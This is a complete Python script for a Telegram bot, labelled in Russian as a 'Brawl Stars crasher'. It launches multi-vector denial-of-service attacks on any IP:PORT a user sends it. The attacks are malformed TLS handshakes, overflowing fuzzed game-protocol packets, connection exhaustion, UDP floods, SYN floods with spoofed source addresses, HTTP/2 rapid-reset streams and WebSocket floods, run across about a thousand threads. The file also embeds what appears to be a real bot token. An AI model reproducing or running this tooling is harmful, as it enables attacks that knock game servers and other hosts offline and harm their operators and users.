#!/usr/bin/env python3
import socket, struct, threading, random, time, re, os, sys, logging, base64, ssl as ssl_lib
import telebot
from telebot import types

BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
TLS_THREADS = 200
PARSER_THREADS = 150
KEEPALIVE_THREADS = 200
UDP_THREADS = 150
SYN_THREADS = 100
HTTP2_THREADS = 100
WS_THREADS = 100

logging.basicConfig(level=logging.INFO, stream=sys.stdout)
logger = logging.getLogger(__name__)
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
active_attacks = {}

MALFORMED_TLS = [
    bytes.fromhex("1603010200010001FC0303" + "AA" * 32 + "00" + "0004" + "C0A8C09F" + "00FF0100"),
    bytes.fromhex("1603010100010000FC0303" + "BB" * 32 + "00" + "0002" + "C02B" + "01" + "00"),
    bytes.fromhex("160301001C0303" + "CC" * 32 + "00" + "0000" + "0000" + "0100"),
    bytes.fromhex("160301FFFA0303" + "DD" * 32 + "00" + "0004" + "C02BC02F" + "00FF" + "FF" * 65530),
]
TITAN_MSG = {'HELLO': 10100, 'LOGIN': 10101, 'KEEP_ALIVE': 10108, 'MATCHMAKING': 14101, 'BATTLE': 14102, 'HOME': 24101}
TITAN_VER = 1

def titan_packet(msg_type, overflow=False):
    msg_id = struct.pack(">H", msg_type)
    length_field = struct.pack(">I", 0xFFFFFF)[1:] if overflow else struct.pack(">I", random.randint(16, 1024))[1:]
    version = struct.pack(">I", TITAN_VER)
    body = os.urandom(random.randint(4, 2048))
    return msg_id + length_field + version + body

def tls_hello_session():
    sid = os.urandom(32)
    rand = os.urandom(28)
    hello = b'\x16\x03\x01' + struct.pack(">H", 70) + b'\x03\x03' + rand + b'\x20' + sid + b'\x00\x04\xC0\x2B\xC0\x2F\x01\x00\x00\xFF\x01\x00'
    return hello

def tls_worker(ip, port, stop_flag):
    idx = 0
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            payload = MALFORMED_TLS[idx % len(MALFORMED_TLS)] if idx % 3 == 0 else tls_hello_session()
            sock.send(payload)
            idx += 1
            sock.close()
        except:
            pass
        time.sleep(0.0001)

def parser_worker(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((ip, port))
            for mt in list(TITAN_MSG.values()):
                if stop_flag.is_set():
                    break
                for ov in [True, False, True]:
                    sock.send(titan_packet(mt, overflow=ov))
                    time.sleep(0.00001)
            sock.close()
        except:
            pass
        time.sleep(0.0005)

def keepalive_worker(ip, port, stop_flag):
    conns = []
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((ip, port))
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.send(titan_packet(TITAN_MSG['KEEP_ALIVE']))
            conns.append(sock)
            if len(conns) > 500:
                for old in conns[:100]:
                    try:
                        old.close()
                    except:
                        pass
                conns = conns[100:]
        except:
            pass
        time.sleep(0.001)

def udp_worker(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(50):
                if stop_flag.is_set():
                    break
                size = random.randint(2000, 32768)
                data = os.urandom(size)
                for offset in range(0, size, 1400):
                    sock.sendto(data[offset:offset+1400], (ip, port))
                    time.sleep(0.000001)
            sock.close()
        except:
            pass
        time.sleep(0.00001)

def syn_worker(ip, port, stop_flag):
    fake_ips = [f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(100)]
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            for fip in fake_ips[:10]:
                sp = random.randint(1024, 65535)
                ip_hdr = struct.pack('!BBHHHBBH4s4s', (4 << 4) + 5, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(fip), socket.inet_aton(ip))
                tcp_hdr = struct.pack('!HHLLBBHHH', sp, port, random.randint(0, 4294967295), 0, (5 << 4), 2, 5840, 0, 0)
                sock.sendto(ip_hdr + tcp_hdr, (ip, 0))
                time.sleep(0.000001)
            sock.close()
        except:
            pass
        time.sleep(0.0001)

def http2_worker(ip, port, stop_flag):
    sid = 1
    while not stop_flag.is_set():
        try:
            ctx = ssl_lib.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl_lib.CERT_NONE
            ctx.set_alpn_protocols(['h2'])
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            ssock = ctx.wrap_socket(sock, server_hostname=ip)
            ssock.connect((ip, port))
            ssock.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
            ssock.send(b'\x00\x00\x00\x04\x00\x00\x00\x00\x00')
            for _ in range(100):
                if stop_flag.is_set():
                    break
                hdr = struct.pack(">I", 0x01000000 | sid)[1:] + struct.pack(">I", 0x88000000)
                ssock.send(hdr)
                rst = struct.pack(">I", 4)[1:] + b'\x03\x00' + struct.pack(">I", sid)[1:] + struct.pack(">I", 0)
                ssock.send(rst)
                sid += 2
                time.sleep(0.000001)
            ssock.close()
        except:
            pass
        time.sleep(0.0005)

def ws_worker(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            key = base64.b64encode(os.urandom(16)).decode()
            req = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
            sock.send(req.encode())
            resp = sock.recv(1024)
            if b'101' in resp:
                for _ in range(50):
                    if stop_flag.is_set():
                        break
                    size = random.randint(1024, 65535)
                    mask_bit = random.randint(0, 1)
                    mask_key = os.urandom(4) if mask_bit else b''
                    if size < 126:
                        header = struct.pack(">BB", 0x82 | mask_bit, size | (0x80 if mask_bit else 0x00))
                    elif size < 65536:
                        header = struct.pack(">BBH", 0x82 | mask_bit, 126 | (0x80 if mask_bit else 0x00), size)
                    else:
                        header = struct.pack(">BBQ", 0x82 | mask_bit, 127 | (0x80 if mask_bit else 0x00), size)
                    payload = os.urandom(size)
                    if mask_bit:
                        payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
                    sock.send(header + mask_key + payload)
                    time.sleep(0.00001)
            sock.close()
        except:
            pass
        time.sleep(0.001)

class Attack:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.stop_flag = threading.Event()
        self.threads = []
    def start(self):
        configs = [(tls_worker, TLS_THREADS), (parser_worker, PARSER_THREADS), (keepalive_worker, KEEPALIVE_THREADS), (udp_worker, UDP_THREADS), (syn_worker, SYN_THREADS), (http2_worker, HTTP2_THREADS), (ws_worker, WS_THREADS)]
        for func, count in configs:
            for _ in range(count):
                if self.stop_flag.is_set():
                    break
                t = threading.Thread(target=func, args=(self.ip, self.port, self.stop_flag), daemon=True)
                self.threads.append(t)
                t.start()
    def stop(self):
        self.stop_flag.set()

def parse_target(text):
    m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
    if m:
        return m.group(1), int(m.group(2))
    m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
    if m:
        return m.group(1), 9339
    return None, None

@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message, "БРАВЛ СТАРС КРАШЕР\nОтправь IP:PORT\n/stop")

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    cid = message.chat.id
    if cid in active_attacks:
        active_attacks[cid].stop()
        del active_attacks[cid]
        bot.reply_to(message, "Атака остановлена")
    else:
        bot.reply_to(message, "Нет активной атаки")

@bot.message_handler(func=lambda m: re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
def attack_cmd(message):
    cid = message.chat.id
    ip, port = parse_target(message.text)
    if not ip:
        bot.reply_to(message, "Неверный IP")
        return
    if cid in active_attacks:
        bot.reply_to(message, "Атака уже идёт! /stop")
        return
    if not port:
        port = 9339
    attack = Attack(ip, port)
    attack.start()
    active_attacks[cid] = attack
    total = TLS_THREADS + PARSER_THREADS + KEEPALIVE_THREADS + UDP_THREADS + SYN_THREADS + HTTP2_THREADS + WS_THREADS
    bot.reply_to(message, f"АТАКА ЗАПУЩЕНА\n{ip}:{port}\nПотоков: {total}\n/stop")

@bot.message_handler(func=lambda m: True)
def unknown_cmd(message):
    bot.reply_to(message, "Отправь IP:PORT\n/start")

if __name__ == "__main__":
    logger.info("Бот запущен...")
    bot.remove_webhook()
    bot.polling(none_stop=True) 
